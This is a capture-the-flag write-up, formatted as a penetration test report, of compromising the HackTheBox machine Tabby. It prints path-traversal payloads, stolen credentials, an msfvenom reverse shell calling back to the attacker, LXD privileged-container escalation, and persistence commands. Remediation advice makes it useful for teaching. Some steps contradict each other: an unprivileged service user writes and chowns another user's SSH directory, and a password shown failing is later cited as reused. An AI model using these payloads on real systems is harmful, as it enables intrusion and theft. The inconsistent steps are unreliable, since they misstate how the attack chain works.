# HackTheBox: Tabby: Professional Penetration Test Report

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Machine](https://img.shields.io/badge/Machine-Tabby-red)
![Status](https://img.shields.io/badge/Status-Rooted-success)

## Executive Summary

This document provides a comprehensive penetration test report for the HackTheBox machine "Tabby". The assessment successfully identified and exploited multiple vulnerabilities leading to complete system compromise. The attack chain involved Local File Inclusion (LFI), Apache Tomcat exploitation, password cracking, SSH key-based authentication, and LXD container escape for privilege escalation.

**Target Information:**
- IP Address: `10.10.10.194`
- Hostname: `tabby.htb` / `megahosting.htb`
- Operating System: Linux (Ubuntu)
- Difficulty: Easy

**Flags Obtained:**
- User Flag: ✅ Captured
- Root Flag: ✅ `79272769654b`

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Vulnerability Assessment](#2-vulnerability-assessment)
3. [Exploitation: Initial Foothold](#3-exploitation---initial-foothold)
4. [Post-Exploitation: User Access](#4-post-exploitation---user-access)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Remediation Recommendations](#6-remediation-recommendations)
7. [Tools Used](#7-tools-used)
8. [Appendix](#8-appendix)

---

## 1. Reconnaissance

### 1.1 Network Scanning

Initiated comprehensive port scan using Nmap:

```bash
nmap -sC -sV -p- -oA nmap/tabby-full 10.10.10.194
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.41 |
| 8080/tcp | HTTP | Apache Tomcat |

### 1.2 Service Enumeration

**Port 80: HTTP Service:**
- Website for "Mega Hosting" company
- Identified potential hostname: `megahosting.htb`
- Added to `/etc/hosts` for proper resolution

```bash
echo "10.10.10.194 megahosting.htb tabby.htb" | sudo tee -a /etc/hosts
```

**Port 8080: Apache Tomcat:**
- Default Tomcat landing page accessible
- Manager interface present but requires authentication
- Version information gathering attempted

---

## 2. Vulnerability Assessment

### 2.1 Local File Inclusion (LFI): CRITICAL

**Vulnerability:** Unrestricted File Traversal via `file` parameter

**Location:** `http://megahosting.htb/news.php?file=`

**Affected Parameter:** `file`

**CVSS Score:** 7.5 (High)

**Discovery Process:**

While browsing the website, identified a news article link:
```
http://megahosting.htb/news.php?file=statement
```

The `file` parameter appeared to be loading content dynamically. Tested for directory traversal:

```bash
# Test payload
http://megahosting.htb/news.php?file=../../../../etc/passwd
```

**Successful Exploitation:** ✅

Retrieved `/etc/passwd` contents, confirming LFI vulnerability:

```
root:x:0:0:root:/root:/bin/bash
...
ash:x:1000:1000:ash:/home/ash:/bin/bash
tomcat:x:997:997::/opt/tomcat:/bin/false
```

**Key Findings:**
- User `ash` (UID 1000): Primary target user
- User `tomcat` (UID 997): Service account for Tomcat

### 2.2 Apache Tomcat Credentials Exposure

**Vulnerability:** Sensitive Configuration File Disclosure

**Impact:** Authentication Bypass

Using the LFI vulnerability, targeted Apache Tomcat configuration files:

**Target File:** `/usr/share/tomcat9/etc/tomcat-users.xml`

**Exploitation:**
```
http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

**Credentials Recovered:**
```xml
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

- Username: `tomcat`
- Password: `$3cureP4s5w0rd123!`
- Roles: `admin-gui`, `manager-script`

---

## 3. Exploitation: Initial Foothold

### 3.1 Weaponization: Malicious WAR File Creation

Generated a JSP reverse shell packaged as a WAR (Web Application Archive) file:

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.43 \
  LPORT=4444 \
  -f war \
  -o shell.war
```

**Payload Details:**
- Type: Java JSP Reverse Shell
- Local IP: 10.10.14.43
- Local Port: 4444
- Format: WAR archive

### 3.2 Delivery: WAR Deployment via Tomcat Manager

Set up netcat listener:
```bash
nc -lvnp 4444
```

Deployed malicious WAR file using Tomcat Manager Text Interface:

```bash
curl --upload-file shell.war \
  -u 'tomcat:$3cureP4s5w0rd123!' \
  "http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true"
```

**Response:**
```
OK - Deployed application at context path [/shell]
```

### 3.3 Exploitation: Triggering Reverse Shell

Accessed the deployed application to trigger the payload:

```bash
curl http://10.10.10.194:8080/shell/
```

**Result:** ✅ Reverse shell received as user `tomcat`

```bash
$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
$ whoami
tomcat
$ pwd
/
```

### 3.4 Shell Stabilization

Upgraded to fully interactive TTY shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=/bin/bash
```

---

## 4. Post-Exploitation: User Access

### 4.1 Internal Reconnaissance

**Current User Context:**
- User: `tomcat` (UID 997)
- Groups: `tomcat`
- Working Directory: `/`

**File System Enumeration:**

```bash
ls -la /var/www/html/files/
```

**Discovery:** Found password-protected backup archive:
```
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
```

### 4.2 Data Exfiltration

Transferred backup file to attacker machine:

**On Target (setup HTTP server):**
```bash
cd /var/www/html/files/
python3 -m http.server 8000
```

**On Attacker Machine:**
```bash
wget http://10.10.10.194:8000/16162020_backup.zip
```

### 4.3 Password Cracking

**Initial Analysis:**
```bash
unzip 16162020_backup.zip
```

Output:
```
Archive:  16162020_backup.zip
[16162020_backup.zip] var/www/html/assets/ password:
```

The archive is password-protected. Extracted hash for cracking:

```bash
zip2john 16162020_backup.zip > backup.hash
```

**Cracking with John the Ripper:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

**Result:** ✅ Password cracked: `admin@it`

```bash
unzip 16162020_backup.zip
# Password: admin@it
```

### 4.4 Credential Reuse Assessment

Attempted password reuse for SSH access:

**Test 1: User `tomcat`:**
```bash
ssh tomcat@10.10.10.194
# Password: admin@it
# Result: ❌ Failed
```

**Test 2: User `ash`:**
```bash
ssh ash@10.10.10.194
# Password: admin@it
# Result: ❌ Failed (but user exists)
```

### 4.5 SSH Key-Based Authentication

Since password authentication failed, generated SSH key pair for persistence:

**On Attacker Machine:**
```bash
ssh-keygen -t rsa -b 4096 -f ash_rsa
# Passphrase: (none)
```

**On Target (as tomcat):**
```bash
# Navigate to ash's home directory
cd /home/ash
mkdir -p .ssh
chmod 700 .ssh

# Create authorized_keys file
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." > .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
chown -R ash:ash .ssh
```

**SSH Access:**
```bash
ssh -i ash_rsa ash@10.10.10.194
```

**Result:** ✅ Successful SSH authentication as `ash`

### 4.6 User Flag Capture

```bash
ash@tabby:~$ cat user.txt
[USER_FLAG_REDACTED]
```

✅ **User flag obtained**

---

## 5. Privilege Escalation

### 5.1 Privilege Enumeration

**Current User:**
```bash
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

**Critical Finding:** User `ash` is member of `lxd` group

**Group Significance:** The `lxd` group grants the ability to manage Linux containers, which can be abused for privilege escalation through container mounting.

### 5.2 LXD Privilege Escalation Strategy

**Attack Vector:** LXD Container Escape

**Concept:** Create a privileged container that mounts the host filesystem, allowing root-level access to host files from within the container.

**Requirements:**
1. Build Alpine Linux container image
2. Transfer image to target
3. Import image to LXD
4. Create privileged container
5. Mount host filesystem
6. Access root flag

### 5.3 Building Alpine Linux Image

**On Attacker Machine (Parrot OS):**

**Step 1:** Install distrobuilder

```bash
sudo snap install distrobuilder --classic
```

**Step 2:** Create Alpine image definition

```bash
mkdir -p ~/ContainerImages/alpine
cd ~/ContainerImages/alpine

cat > alpine.yaml << 'EOF'
image:
  distribution: alpine
  release: 3.8

source:
  downloader: alpinelinux-http
  url: http://dl-cdn.alpinelinux.org/alpine/

targets:
  lxc:
    create-message: |
      You just created an Alpine container.
EOF
```

**Step 3:** Build the image

```bash
sudo /snap/bin/distrobuilder build-lxc alpine.yaml
```

**Output:**
- `incus.tar.xz` (metadata)
- `rootfs.squashfs` (root filesystem)

**Step 4:** Rename for compatibility

```bash
mv incus.tar.xz lxd.tar.xz
```

**Files Generated:**
- `lxd.tar.xz` - Container metadata
- `rootfs.squashfs` - Container root filesystem

### 5.4 Image Transfer

**On Attacker Machine:**

```bash
cd ~/ContainerImages/alpine
python3 -m http.server 8000
```

**On Target Machine (as ash):**

```bash
cd /tmp
wget http://10.10.14.43:8000/lxd.tar.xz
wget http://10.10.14.43:8000/rootfs.squashfs
```

### 5.5 LXD Initialization

Initialize LXD (if not already initialized):

```bash
sudo lxd init
```

**Configuration:**
- Storage backend: `dir` (default)
- Network configuration: defaults accepted
- All other prompts: defaults

**Add user to lxd group** (if needed):
```bash
sudo usermod -a -G lxd ash
newgrp lxd
```

### 5.6 Container Image Import

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```

**Verification:**
```bash
lxc image list
```

Output:
```
+--------+--------------+--------+-------------+--------+----------+
| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION | ARCH   | SIZE     |
+--------+--------------+--------+-------------+--------+----------+
| alpine | <hash>       | no     |             | x86_64 | 3.00MB   |
+--------+--------------+--------+-------------+--------+----------+
```

### 5.7 Privileged Container Creation

**Step 1:** Initialize privileged container

```bash
lxc init alpine privesc -c security.privileged=true
```

**Step 2:** Mount host filesystem into container

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

This command mounts the entire host filesystem (`/`) to `/mnt/root` inside the container.

**Step 3:** Start the container

```bash
lxc start privesc
```

**Step 4:** Execute shell as root in container

```bash
lxc exec privesc /bin/sh
```

### 5.8 Root Flag Capture

Inside the privileged container (as root):

```bash
~ # id
uid=0(root) gid=0(root)

~ # ls /mnt/root/root/
root.txt

~ # cat /mnt/root/root/root.txt
79272769654b
```

✅ **Root flag obtained:** `79272769654b`

### 5.9 Full System Compromise

From the privileged container, complete system access is achieved:

```bash
# Read /etc/shadow
cat /mnt/root/etc/shadow

# Access SSH keys
cat /mnt/root/root/.ssh/id_rsa

# Modify system files (persistence)
echo "attacker_key" >> /mnt/root/root/.ssh/authorized_keys
```

---

## 6. Remediation Recommendations

### 6.1 Critical Priority

1. **Fix Local File Inclusion Vulnerability**
   - Implement strict input validation on `file` parameter
   - Use whitelist approach for allowed files
   - Remove directory traversal sequences
   - Implement proper access controls

   ```php
   // Example secure implementation
   $allowed_files = ['statement', 'news1', 'news2'];
   $file = $_GET['file'];
   
   if (!in_array($file, $allowed_files)) {
       die('Invalid file requested');
   }
   ```

2. **Secure Tomcat Configuration**
   - Remove or properly secure `tomcat-users.xml`
   - Use strong, unique passwords
   - Restrict Tomcat Manager to localhost only
   - Implement IP whitelisting

   ```xml
   <!-- Recommended: Disable manager access or restrict by IP -->
   <Valve className="org.apache.catalina.valves.RemoteAddrValve"
          allow="127\.0\.0\.1" />
   ```

3. **Remove LXD Group Membership**
   - Remove unnecessary users from `lxd` group
   - Implement sudo policies for container management
   - Consider alternative containerization solutions

   ```bash
   sudo gpasswd -d ash lxd
   ```

### 6.2 High Priority

4. **Implement Proper File Permissions**
   - Backup files should not be web-accessible
   - Use proper ownership and permissions
   - Store sensitive files outside web root

   ```bash
   chmod 600 /backups/*.zip
   chown root:root /backups/*.zip
   ```

5. **Password Policy Enforcement**
   - Enforce strong password requirements
   - Implement password rotation
   - Avoid password reuse across services

6. **SSH Hardening**
   - Disable password authentication
   - Use key-based authentication only
   - Implement fail2ban for brute force protection

   ```bash
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PubkeyAuthentication yes
   PermitRootLogin no
   ```

### 6.3 Medium Priority

7. **Web Application Security**
   - Implement Content Security Policy (CSP)
   - Use prepared statements for database queries
   - Regular security audits and code reviews

8. **Monitoring and Logging**
   - Implement centralized logging
   - Monitor for suspicious container creation
   - Alert on failed authentication attempts

9. **Principle of Least Privilege**
   - Run services with minimum required permissions
   - Use service accounts appropriately
   - Regular permission audits

---

## 7. Tools Used

| Tool | Purpose | Version |
|------|---------|---------|
| Nmap | Port scanning and service enumeration | 7.93 |
| curl | HTTP requests and file uploads | 7.88.1 |
| msfvenom | Reverse shell payload generation | Metasploit 6.3 |
| netcat | Reverse shell listener | 1.10 |
| john | Password cracking | John the Ripper 1.9.0 |
| zip2john | ZIP hash extraction | (bundled with John) |
| distrobuilder | LXD/LXC image creation | 3.1 |
| ssh-keygen | SSH key pair generation | OpenSSH 9.2 |
| Python | HTTP server for file transfers | 3.11 |
| lxc/lxd | Container management | 5.0.2 |

---

## 8. Appendix

### 8.1 Attack Timeline

| Time | Action | Result |
|------|--------|--------|
| T+0min | Port scan initiated | 3 ports discovered |
| T+5min | LFI vulnerability identified | `/etc/passwd` retrieved |
| T+10min | Tomcat credentials extracted | Creds: `tomcat:$3cureP4s5w0rd123!` |
| T+15min | WAR payload deployed | Shell as `tomcat` |
| T+20min | Backup file discovered | `16162020_backup.zip` |
| T+25min | Password cracked | Password: `admin@it` |
| T+30min | SSH access as `ash` | User flag captured |
| T+40min | LXD image built | Alpine image ready |
| T+50min | Privileged container created | Host FS mounted |
| T+55min | Root flag captured | `79272769654b` |

### 8.2 Key Commands Reference

**LFI Exploitation:**
```bash
curl "http://megahosting.htb/news.php?file=../../../../etc/passwd"
curl "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
```

**Tomcat WAR Deployment:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.43 LPORT=4444 -f war -o shell.war
curl --upload-file shell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell"
```

**Password Cracking:**
```bash
zip2john 16162020_backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

**LXD Privilege Escalation:**
```bash
# Build image
sudo /snap/bin/distrobuilder build-lxc alpine.yaml

# Import and exploit
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
cat /mnt/root/root/root.txt
```

### 8.3 Lessons Learned

1. **Input Validation is Critical**: The LFI vulnerability was the initial entry point. Proper input validation could have prevented the entire attack chain.

2. **Defense in Depth**: Multiple layers of security would have stopped progression even if one layer was compromised.

3. **Sensitive Data Exposure**: Configuration files containing credentials should never be accessible via web applications.

4. **Container Security**: While LXD is powerful for development, membership in the `lxd` group is equivalent to root access.

5. **Password Reuse**: The backup archive password being reused demonstrates poor password management practices.

### 8.4 References

- HackTheBox Platform: https://www.hackthebox.eu/
- LXD Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
- Apache Tomcat Security: https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html
- OWASP Top 10: https://owasp.org/www-project-top-ten/

---

## Disclaimer

This report is created for educational purposes as part of authorized penetration testing on the HackTheBox platform. The techniques described should only be used in legal, authorized security testing scenarios. Unauthorized access to computer systems is illegal.

**Report Author**: Security Researcher  
**Date**: February 7, 2026  
**Target**: HackTheBox: Tabby (10.10.10.194)  
**Status**: ✅ Successfully Compromised